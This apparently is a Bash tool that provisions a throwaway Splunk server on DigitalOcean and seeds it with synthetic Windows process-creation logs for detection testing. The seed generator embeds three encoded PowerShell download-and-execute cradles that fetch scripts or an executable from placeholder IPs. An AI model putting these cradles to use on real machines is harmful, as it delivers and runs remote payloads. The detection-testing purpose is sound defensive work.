#!/usr/bin/env bash
# Disposable Splunk Enterprise test server on DigitalOcean (doctl + curl + ssh + python3 stdlib only).
#
#   scripts/splunk-droplet.sh up [size]   create key/droplet/firewall, wait for Splunk, token, indexes, write .env.local
#   scripts/splunk-droplet.sh seed        ingest Sysmon EventCode=1 XML + Security 4688 samples, verify with searches
#   scripts/splunk-droplet.sh status      droplet, firewall, Splunk version, event counts per sourcetype
#   scripts/splunk-droplet.sh down        delete droplet + firewall, remove .env.local
#   scripts/splunk-droplet.sh ssh [cmd]   ssh root@droplet
#
# Idempotent: re-running `up` refreshes the firewall source IP and .env.local without recreating the droplet.
# Secrets (admin password, bearer token) live only in .env.local (mode 600, git-ignored) and are never printed.
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ENV_FILE="$ROOT/.env.local"
CLOUD_INIT="$ROOT/scripts/cloud-init.yml"
DO_CONTEXT="${DO_CONTEXT:-default}"
DROPLET="${DROPLET:-dea-splunk}"
REGION="${REGION:-tor1}"
IMAGE="${IMAGE:-ubuntu-24-04-x64}"
SIZE="${SIZE:-s-2vcpu-4gb}"
SSH_KEY="${SSH_KEY:-$HOME/.ssh/dea-splunk}"
SSH_KEY_NAME="dea-splunk"
FW_NAME="$DROPLET"
WAIT_SECS="${WAIT_SECS:-900}"
INDEX="wineventlog"
SYSMON_ST='XmlWinEventLog:Microsoft-Windows-Sysmon/Operational'
SEC_ST='WinEventLog:Security'
SEED_SOURCE="dea-seed"

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

log() { printf '%s %s\n' "$(date +%H:%M:%S)" "$*"; }
die() { log "ERROR: $*" >&2; exit 1; }
need() { for c in "$@"; do command -v "$c" >/dev/null || die "missing tool: $c"; done; }
dc() { doctl --context "$DO_CONTEXT" compute "$@"; }

droplet_row() { dc droplet list --format ID,Name,Status,PublicIPv4 --no-header | awk -v n="$DROPLET" '$2==n'; }  # IP last: blank while provisioning
fw_id() { dc firewall list --format ID,Name --no-header | awk -v n="$FW_NAME" '$2==n{print $1}'; }
my_ip() { curl -fsS https://api.ipify.org; }
load_env() { [ -f "$ENV_FILE" ] || die "$ENV_FILE missing; run: $0 up"; set -a; . "$ENV_FILE"; set +a; API="https://$SPLUNK_HOST:$SPLUNK_PORT"; }
write_env() { # ip pw token
  umask 077
  printf 'SPLUNK_HOST=%s\nSPLUNK_PORT=8089\nSPLUNK_TOKEN=%s\nSPLUNK_VERIFY=0\nSPLUNK_APP=search\nSPLUNK_OWNER=admin\nSPLUNK_ADMIN_PASSWORD=%s\nSPLUNK_WEB=https://%s:8000\n' \
    "$1" "$3" "$2" "$1" > "$ENV_FILE"
  chmod 600 "$ENV_FILE"
}

# --- Splunk REST (credential goes through a curl config file, never argv) ---
auth_basic() { printf 'user = "admin:%s"\n' "$1" > "$TMP/auth"; }
auth_token() { printf 'header = "Authorization: Bearer %s"\n' "$1" > "$TMP/auth"; }
rest() { curl -sS --fail-with-body -k -K "$TMP/auth" "$@"; }                 # body, fails on HTTP >= 400 (body shown)
code() { curl -sk -K "$TMP/auth" -o /dev/null -w '%{http_code}' "$@" || true; }  # HTTP code, 000 if unreachable
urlenc() { python3 -I -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"; }
jget() { python3 -I -c 'import functools, json, sys
d = json.load(sys.stdin)
print(functools.reduce(lambda o, k: o[int(k)] if isinstance(o, list) else o[k], sys.argv[1].split("."), d))' "$1"; }
rows() { python3 -I -c 'import json, sys
for r in json.load(sys.stdin).get("results", []): print("   " + "  ".join(f"{k}={v}" for k, v in r.items()))'; }
search() { # SPL [earliest] -> oneshot JSON
  rest "$API/services/search/jobs" --data-urlencode "search=$1" -d exec_mode=oneshot -d "earliest_time=${2:--7d}" -d latest_time=now -d output_mode=json -d count=0
}
count_st() { # sourcetype [extra SPL] -> event count of seed data (0 if none)
  search "search index=$INDEX sourcetype=\"$1\" source=$SEED_SOURCE ${2:-} | stats count" -30h | jget results.0.count 2>/dev/null || echo 0
}

ensure_stanza() { # endpoint name key=val... (GET -> 200 exists, else POST)
  local ep="$1" name="$2"; shift 2
  if [ "$(code "$API/$ep/$(urlenc "$name")")" = 200 ]; then log "  $ep: $name exists"
  else
    local args=(-d "name=$name"); local kv; for kv in "$@"; do args+=(--data-urlencode "$kv"); done
    rest "$API/$ep" "${args[@]}" -o /dev/null; log "  $ep: $name created"
  fi
}

cmd_up() {
  need doctl curl ssh ssh-keygen python3 awk
  SIZE="${1:-$SIZE}"
  local t0=$SECONDS key_id row id ip pw token myip fw rules_in rules_out c

  # 1. ssh key (local + DigitalOcean)
  [ -f "$SSH_KEY" ] || { ssh-keygen -q -t ed25519 -f "$SSH_KEY" -N '' -C "$SSH_KEY_NAME"; log "generated $SSH_KEY"; }
  key_id="$(dc ssh-key list --format ID,Name --no-header | awk -v n="$SSH_KEY_NAME" '$2==n{print $1}')"
  [ -n "$key_id" ] || { key_id="$(dc ssh-key import "$SSH_KEY_NAME" --public-key-file "$SSH_KEY.pub" --format ID --no-header)"; log "imported ssh key $SSH_KEY_NAME ($key_id)"; }

  # 2. droplet
  row="$(droplet_row)"
  if [ -n "$row" ]; then
    read -r id _ _ ip <<<"$row"
    [ -f "$ENV_FILE" ] || die "droplet $DROPLET exists (id=$id) but $ENV_FILE is gone; run '$0 down' then 'up'"
    load_env; pw="$SPLUNK_ADMIN_PASSWORD"; token="${SPLUNK_TOKEN:-}"
    log "droplet $DROPLET exists: id=$id ip=$ip (kept)"
  else
    pw="$(python3 -I -c 'import secrets, string; print("".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(20)))')"
    sed "s|__SPLUNK_PW__|$pw|" "$CLOUD_INIT" > "$TMP/cloud-init.yml"
    log "creating droplet $DROPLET ($SIZE, $REGION, $IMAGE) ..."
    read -r id ip < <(dc droplet create "$DROPLET" --region "$REGION" --size "$SIZE" --image "$IMAGE" --ssh-keys "$key_id" \
      --user-data-file "$TMP/cloud-init.yml" --wait --format ID,PublicIPv4 --no-header)
    while [ -z "${ip:-}" ]; do sleep 5; ip="$(dc droplet get "$id" --format PublicIPv4 --no-header)"; done
    token=""; write_env "$ip" "$pw" "$token"
    log "droplet created: id=$id ip=$ip (password saved to $ENV_FILE)"
  fi

  # 3. firewall: 22/8000/8089 from the operator's current public IP only
  myip="$(my_ip)"
  rules_in="protocol:tcp,ports:22,address:$myip/32 protocol:tcp,ports:8000,address:$myip/32 protocol:tcp,ports:8089,address:$myip/32"
  rules_out="protocol:icmp,address:0.0.0.0/0,address:::/0 protocol:tcp,ports:0,address:0.0.0.0/0,address:::/0 protocol:udp,ports:0,address:0.0.0.0/0,address:::/0"
  fw="$(fw_id)"
  if [ -n "$fw" ]; then
    dc firewall update "$fw" --name "$FW_NAME" --inbound-rules "$rules_in" --outbound-rules "$rules_out" --droplet-ids "$id" >/dev/null
    log "firewall $FW_NAME ($fw) updated: tcp 22/8000/8089 from $myip/32"
  else
    fw="$(dc firewall create --name "$FW_NAME" --inbound-rules "$rules_in" --outbound-rules "$rules_out" --droplet-ids "$id" --format ID --no-header)"
    log "firewall $FW_NAME ($fw) created: tcp 22/8000/8089 from $myip/32"
  fi

  # 4. wait for splunkd (cloud-init: apt, 1.4 GB download, dpkg, first start)
  API="https://$ip:8089"; auth_basic "$pw"
  log "waiting for $API/services/server/info (up to $((WAIT_SECS / 60)) min) ..."
  local deadline=$((SECONDS + WAIT_SECS))
  until c="$(code "$API/services/server/info")"; [ "$c" = 200 ]; do
    [ "$c" != 401 ] || die "splunkd is up but rejects the admin password (user-seed.conf not applied?); see: $0 ssh tail -50 /var/log/cloud-init-output.log"
    [ $SECONDS -lt $deadline ] || die "Splunk not answering after ${WAIT_SECS}s (last HTTP $c); see: $0 ssh tail -50 /var/log/cloud-init-output.log"
    sleep 15
  done
  log "splunkd up: version $(rest "$API/services/server/info" -d output_mode=json -G | jget entry.0.content.version) after $((SECONDS - t0))s"
  until [ "$(rest "$API/services/kvstore/status" -G -d output_mode=json 2>/dev/null | jget entry.0.content.current.status 2>/dev/null)" = ready ]; do  # token auth needs the KV store
    [ $SECONDS -lt $deadline ] || die "KV store not ready after ${WAIT_SECS}s; see: $0 ssh tail -50 /opt/splunk/var/log/splunk/mongod.log"
    sleep 10
  done

  # 5. token auth + bearer token (reuse a still-valid one)
  rest -X POST "$API/services/admin/token-auth/tokens_auth" -d disabled=false -o /dev/null
  if [ -n "$token" ]; then auth_token "$token"; [ "$(code "$API/services/server/info")" = 200 ] || token=""; auth_basic "$pw"; fi
  if [ -z "$token" ]; then
    token="$(rest "$API/services/authorization/tokens" -d name=admin -d audience=dea --data-urlencode 'expires_on=+30d' -d output_mode=json | jget entry.0.content.token)"  # urlencode keeps the '+'
    log "bearer token created (user admin, audience dea, +30d)"
  else log "bearer token still valid (kept)"; fi

  # 6. indexes + props (props/transforms are written by cloud-init before first start; REST is the fallback)
  log "indexes / props:"
  ensure_stanza services/data/indexes wineventlog
  ensure_stanza services/data/indexes dea_attack
  ensure_stanza servicesNS/nobody/search/configs/conf-props "$SYSMON_ST" "KV_MODE=xml" "SHOULD_LINEMERGE=false" "LINE_BREAKER=((?<=</Event>)\\s*)" \
    "TIME_PREFIX=SystemTime='" "TIME_FORMAT=%Y-%m-%dT%H:%M:%S" "MAX_TIMESTAMP_LOOKAHEAD=32" "TZ=UTC"
  ensure_stanza servicesNS/nobody/search/configs/conf-props "$SEC_ST" "SHOULD_LINEMERGE=true" "TIME_FORMAT=%m/%d/%Y %I:%M:%S %p" "MAX_TIMESTAMP_LOOKAHEAD=30" "TZ=UTC"

  write_env "$ip" "$pw" "$token"
  log "wrote $ENV_FILE (mode 600): SPLUNK_HOST=$ip SPLUNK_WEB=https://$ip:8000"
  log "up done in $((SECONDS - t0))s. Next: $0 seed; then: set -a; . $ENV_FILE; set +a; uv run dea inventory --splunk real --refresh"
}

gen_seed() { # outdir -> sysmon/*.xml and sec/*.log, file name NNN__<host>.<ext>
  python3 -I - "$1" <<'PY'
import base64, os, random, sys, uuid
from datetime import datetime, timedelta, timezone
from xml.sax.saxutils import escape

out, rnd, now = sys.argv[1], random.Random(7), datetime.now(timezone.utc)
SYS = 'C:\\Windows\\System32\\'
PS = SYS + 'WindowsPowerShell\\v1.0\\powershell.exe'
OFF = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\'
EXP = 'C:\\Windows\\explorer.exe'
HOSTS = ['WS01.corp.local', 'WS02.corp.local', 'WS03.corp.local', 'DC01.corp.local']
enc = lambda s: base64.b64encode(s.encode('utf-16le')).decode()
guid = lambda: '{%s}' % uuid.UUID(int=rnd.getrandbits(128))

# (Image, ParentImage, CommandLine, ParentCommandLine, User, IntegrityLevel)
benign = [
    (SYS + 'svchost.exe', SYS + 'services.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p', 'C:\\Windows\\system32\\services.exe', 'NT AUTHORITY\\SYSTEM', 'System'),
    (SYS + 'conhost.exe', SYS + 'cmd.exe', '\\??\\C:\\Windows\\system32\\conhost.exe 0x4', 'cmd.exe /c whoami', 'CORP\\jdoe', 'Medium'),
    (SYS + 'cmd.exe', EXP, 'cmd.exe /c whoami', 'C:\\Windows\\Explorer.EXE', 'CORP\\jdoe', 'Medium'),
    (PS, EXP, '"%s" -NoProfile -File C:\\scripts\\inventory.ps1' % PS, 'C:\\Windows\\Explorer.EXE', 'CORP\\asmith', 'Medium'),
    (PS, SYS + 'svchost.exe', 'powershell.exe -NonInteractive -File C:\\ProgramData\\backup\\nightly.ps1', 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule', 'CORP\\svc_backup', 'High'),
    (PS, SYS + 'cmd.exe', 'powershell.exe -Command "Get-Service | Out-File C:\\temp\\svc.txt"', 'cmd.exe /c C:\\scripts\\check.cmd', 'CORP\\asmith', 'Medium'),
    (OFF + 'WINWORD.EXE', EXP, '"%sWINWORD.EXE" /n "C:\\Users\\jdoe\\Documents\\Q4 plan.docx"' % OFF, 'C:\\Windows\\Explorer.EXE', 'CORP\\jdoe', 'Medium'),
    (OFF + 'EXCEL.EXE', EXP, '"%sEXCEL.EXE" /dde' % OFF, 'C:\\Windows\\Explorer.EXE', 'CORP\\asmith', 'Medium'),
    (OFF + 'OUTLOOK.EXE', EXP, '"%sOUTLOOK.EXE"' % OFF, 'C:\\Windows\\Explorer.EXE', 'CORP\\jdoe', 'Medium'),
    ('C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', EXP, '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', 'C:\\Windows\\Explorer.EXE', 'CORP\\jdoe', 'Medium'),
    (EXP, SYS + 'userinit.exe', 'C:\\Windows\\Explorer.EXE', 'C:\\Windows\\system32\\userinit.exe', 'CORP\\asmith', 'Medium'),
    (SYS + 'taskhostw.exe', SYS + 'svchost.exe', 'taskhostw.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule', 'NT AUTHORITY\\SYSTEM', 'System'),
]
# exactly 3 Office -> powershell -EncodedCommand (real base64 of UTF-16LE PowerShell)
malicious = [
    (PS, OFF + 'WINWORD.EXE', 'powershell.exe -NoP -W Hidden -EncodedCommand ' + enc("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"),
     '"%sWINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\invoice_4471.docm"' % OFF, 'CORP\\jdoe', 'Medium'),
    (PS, OFF + 'EXCEL.EXE', '"%s" -nop -w hidden -EncodedCommand ' % PS + enc("$c=New-Object Net.WebClient;$c.DownloadFile('http://203.0.113.9/u.exe','C:\\Users\\Public\\u.exe');Start-Process C:\\Users\\Public\\u.exe"),
     '"%sEXCEL.EXE" /dde "C:\\Users\\asmith\\Downloads\\payroll_update.xlsm"' % OFF, 'CORP\\asmith', 'Medium'),
    (PS, OFF + 'WINWORD.EXE', 'powershell -encodedcommand ' + enc("Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Invoke-WebRequest -Uri http://192.0.2.77/s.b64 -UseBasicParsing).Content)))"),
     '"%sWINWORD.EXE" /n "C:\\Users\\jdoe\\AppData\\Local\\Temp\\Resume_JSmith.doc"' % OFF, 'CORP\\jdoe', 'Medium'),
]

def sysmon(i, t, img, parent, cmd, pcmd, user, il, host):
    ts = t.strftime('%Y-%m-%dT%H:%M:%S.') + '%03dZ' % (t.microsecond // 1000)
    system = 'SYSTEM' in user
    d = [('RuleName', '-'), ('UtcTime', t.strftime('%Y-%m-%d %H:%M:%S.') + '%03d' % (t.microsecond // 1000)),
         ('ProcessGuid', guid()), ('ProcessId', rnd.randint(1000, 9999)), ('Image', img), ('FileVersion', '-'), ('Description', '-'),
         ('Product', '-'), ('Company', '-'), ('OriginalFileName', img.rsplit('\\', 1)[-1]), ('CommandLine', cmd),
         ('CurrentDirectory', 'C:\\Windows\\system32\\' if system else 'C:\\Users\\%s\\' % user.split('\\')[-1]), ('User', user),
         ('LogonGuid', guid()), ('LogonId', '0x3e7' if system else '0x%x' % rnd.randint(0x10000, 0xfffff)),
         ('TerminalSessionId', 0 if system else 1), ('IntegrityLevel', il), ('Hashes', 'SHA256=%064X' % rnd.getrandbits(256)),
         ('ParentProcessGuid', guid()), ('ParentProcessId', rnd.randint(300, 999)), ('ParentImage', parent), ('ParentCommandLine', pcmd), ('ParentUser', user)]
    data = ''.join("<Data Name='%s'>%s</Data>" % (k, escape(str(v))) for k, v in d)
    return ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' "
            "Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode>"
            "<Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='%s'/><EventRecordID>%d</EventRecordID><Correlation/>"
            "<Execution ProcessID='3424' ThreadID='4560'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>%s</Computer>"
            "<Security UserID='S-1-5-18'/></System><EventData>%s</EventData></Event>\n" % (ts, 100000 + i, host, data))

# (New_Process_Name, Creator_Process_Name, Process_Command_Line, Account_Name, Account_Domain)
sec_chains = [
    (SYS + 'cmd.exe', EXP, 'cmd.exe /c whoami', 'jdoe', 'CORP'),
    (SYS + 'conhost.exe', SYS + 'cmd.exe', '\\??\\C:\\Windows\\system32\\conhost.exe 0x4', 'jdoe', 'CORP'),
    (PS, EXP, '"%s" -NoProfile -File C:\\scripts\\inventory.ps1' % PS, 'asmith', 'CORP'),
    (PS, SYS + 'cmd.exe', 'powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\backup\\nightly.ps1', 'svc_backup', 'CORP'),
    (SYS + 'svchost.exe', SYS + 'services.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p', 'SYSTEM', 'NT AUTHORITY'),
    (SYS + 'notepad.exe', EXP, '"C:\\Windows\\system32\\notepad.exe" C:\\Users\\jdoe\\notes.txt', 'jdoe', 'CORP'),
    (OFF + 'WINWORD.EXE', EXP, '"%sWINWORD.EXE" /n' % OFF, 'jdoe', 'CORP'),
    (SYS + 'msiexec.exe', SYS + 'svchost.exe', 'C:\\Windows\\system32\\msiexec.exe /V', 'SYSTEM', 'NT AUTHORITY'),
    (SYS + 'wbem\\WmiPrvSE.exe', SYS + 'svchost.exe', 'C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding', 'SYSTEM', 'NT AUTHORITY'),
    (SYS + 'tasklist.exe', SYS + 'cmd.exe', 'tasklist /v', 'asmith', 'CORP'),
]

def sec(i, t, newp, creator, cmd, acct, dom, host):
    sid = 'S-1-5-18' if acct == 'SYSTEM' else 'S-1-5-21-1004336348-1177238915-682003330-%d' % (1100 + len(acct))
    logon = '0x3E7' if acct == 'SYSTEM' else '0x%X' % rnd.randint(0x10000, 0xfffff)
    label = 'System' if acct == 'SYSTEM' else 'Medium'
    return (f"{t.strftime('%m/%d/%Y %I:%M:%S %p')}\nLogName=Security\nEventCode=4688\nEventType=0\nComputerName={host}\n"
            f"SourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber={500000 + i}\nKeywords=Audit Success\n"
            f"TaskCategory=Process Creation\nOpCode=Info\nMessage=A new process has been created.\n\n"
            f"Creator Subject:\n\tSecurity ID:\t\t{sid}\n\tAccount Name:\t\t{acct}\n\tAccount Domain:\t\t{dom}\n\tLogon ID:\t\t{logon}\n\n"
            f"Target Subject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\n"
            f"Process Information:\n\tNew Process ID:\t\t0x{rnd.randint(0x1000, 0xffff):x}\n\tNew Process Name:\t{newp}\n"
            f"\tToken Elevation Type:\t%%1938\n\tMandatory Label:\t\tMandatory Label\\{label} Mandatory Level\n"
            f"\tCreator Process ID:\t0x{rnd.randint(0x100, 0xfff):x}\n\tCreator Process Name:\t{creator}\n\tProcess Command Line:\t{cmd}\n")

def times(n):  # spread over the last 24 h, newest ~5 min ago
    return sorted(now - timedelta(seconds=rnd.uniform(300, 86000)) for _ in range(n))

os.makedirs(f'{out}/sysmon'); os.makedirs(f'{out}/sec')
chains = [benign[i % len(benign)] for i in range(57)]
for pos, m in zip(sorted(rnd.sample(range(60), 3)), malicious): chains.insert(pos, m)
for i, (t, ch) in enumerate(zip(times(60), chains)):
    host = rnd.choice(HOSTS[:3])
    open(f'{out}/sysmon/{i:03d}__{host}.xml', 'w').write(sysmon(i, t, *ch, host))
for i, (t, ch) in enumerate(zip(times(40), [sec_chains[i % len(sec_chains)] for i in range(40)])):
    host = rnd.choice(HOSTS[1:])
    open(f'{out}/sec/{i:03d}__{host}.log', 'w').write(sec(i, t, *ch, host))
PY
}

ingest_dir() { # dir sourcetype -> number of events posted (one event per request; host from the file name)
  local f host n=0 st; st="$(urlenc "$2")"
  for f in "$1"/*; do
    host="${f##*__}"; host="${host%.*}"
    rest "$API/services/receivers/simple?index=$INDEX&sourcetype=$st&host=$host&source=$SEED_SOURCE" --data-binary "@$f" -o /dev/null
    n=$((n + 1))
  done
  echo "$n"
}

cmd_seed() {
  need curl python3
  load_env; auth_token "$SPLUNK_TOKEN"
  local have_sys have_sec n deadline
  have_sys="$(count_st "$SYSMON_ST")"; have_sec="$(count_st "$SEC_ST")"
  if [ "$have_sys" -ge 60 ] && [ "$have_sec" -ge 40 ] && [ "${SEED_FORCE:-0}" != 1 ]; then
    log "already seeded (sysmon=$have_sys security=$have_sec); SEED_FORCE=1 to add another batch"
  else
    gen_seed "$TMP/seed"
    log "ingesting via /services/receivers/simple into index=$INDEX ..."
    n="$(ingest_dir "$TMP/seed/sysmon" "$SYSMON_ST")"; log "  $SYSMON_ST: $n events posted"
    n="$(ingest_dir "$TMP/seed/sec" "$SEC_ST")";       log "  $SEC_ST: $n events posted"
    deadline=$((SECONDS + 240))
    until [ "$(count_st "$SYSMON_ST")" -ge $((have_sys + 60)) ] && [ "$(count_st "$SEC_ST")" -ge $((have_sec + 40)) ]; do
      [ $SECONDS -lt $deadline ] || die "events not searchable after 240s: sysmon=$(count_st "$SYSMON_ST") security=$(count_st "$SEC_ST")"
      sleep 10
    done
  fi
  log "verify: counts and time span per sourcetype (seed data, last 30h)"
  search "search index=$INDEX source=$SEED_SOURCE | stats count min(_time) as first max(_time) as last by sourcetype | fieldformat first=strftime(first,\"%F %T\") | fieldformat last=strftime(last,\"%F %T\")" -30h | rows
  log "verify: Sysmon | stats count by Image"
  search "search index=$INDEX sourcetype=\"$SYSMON_ST\" source=$SEED_SOURCE | stats count by Image | sort -count" -30h | rows
  log "verify: Office -> powershell -EncodedCommand (expect 3)"
  search "search index=$INDEX sourcetype=\"$SYSMON_ST\" source=$SEED_SOURCE EventCode=1 ParentImage IN (\"*\\\\WINWORD.EXE\",\"*\\\\EXCEL.EXE\") Image=\"*\\\\powershell.exe\" CommandLine=\"*-EncodedCommand*\" | stats count by ParentImage, User" -30h | rows
  log "verify: Security 4688 | stats count by New_Process_Name"
  search "search index=$INDEX sourcetype=\"$SEC_ST\" source=$SEED_SOURCE EventCode=4688 | stats count by New_Process_Name | sort -count | head 5" -30h | rows
  [ "$(count_st "$SYSMON_ST" 'Image=*')" -gt 0 ] || die "Sysmon Image field does not extract (check props/transforms)"
  [ "$(count_st "$SEC_ST" 'New_Process_Name=*')" -gt 0 ] || die "Security New_Process_Name field does not extract"
  log "seed done"
}

cmd_status() {
  need doctl curl python3
  local row id ip st fw
  row="$(droplet_row)"
  if [ -z "$row" ]; then log "droplet $DROPLET: absent"; else
    read -r id _ st ip <<<"$row"
    log "droplet $DROPLET: id=$id ip=$ip status=$st $(dc droplet get "$id" --format Memory,VCPUs,Disk,Region --no-header | awk '{print $1"MB/"$2"vcpu/"$3"GB/"$4}')"
  fi
  fw="$(fw_id)"
  if [ -z "$fw" ]; then log "firewall $FW_NAME: absent"; else log "firewall $FW_NAME: $fw inbound: $(dc firewall get "$fw" --format InboundRules --no-header)"; fi
  [ -f "$ENV_FILE" ] || { log "$ENV_FILE: absent"; return; }
  load_env; auth_token "$SPLUNK_TOKEN"
  local c; c="$(code "$API/services/server/info")"
  [ "$c" = 200 ] || { log "splunk $API: HTTP $c"; return; }
  log "splunk $API: version $(rest "$API/services/server/info" -G -d output_mode=json | jget entry.0.content.version), web $SPLUNK_WEB"
  log "events per index/sourcetype (last 7d):"
  search "| tstats count where index IN (wineventlog, dea_attack) by index, sourcetype" | rows
}

cmd_down() {
  need doctl
  local row id ip fw
  row="$(droplet_row)"
  if [ -n "$row" ]; then
    read -r id _ _ ip <<<"$row"
    dc droplet delete -f "$id"
    while [ -n "$(droplet_row)" ]; do sleep 5; done  # deletion is asynchronous; `up` must not see the old row
    log "droplet $DROPLET ($id, $ip) deleted"
    ssh-keygen -R "$ip" >/dev/null 2>&1 || true
  else log "droplet $DROPLET: already absent"; fi
  fw="$(fw_id)"
  if [ -n "$fw" ]; then dc firewall delete -f "$fw"; log "firewall $FW_NAME ($fw) deleted"; else log "firewall $FW_NAME: already absent"; fi
  rm -f "$ENV_FILE"; log "$ENV_FILE removed"
}

cmd_ssh() {
  local row ip
  row="$(droplet_row)"; [ -n "$row" ] || die "droplet $DROPLET absent"
  read -r _ _ _ ip <<<"$row"
  exec ssh -i "$SSH_KEY" -o StrictHostKeyChecking=accept-new "root@$ip" "$@"
}

case "${1:-}" in
  up) shift; cmd_up "$@" ;;
  seed) cmd_seed ;;
  status) cmd_status ;;
  down) cmd_down ;;
  ssh) shift; cmd_ssh "$@" ;;
  *) sed -n '2,10p' "$0"; exit 2 ;;
esac
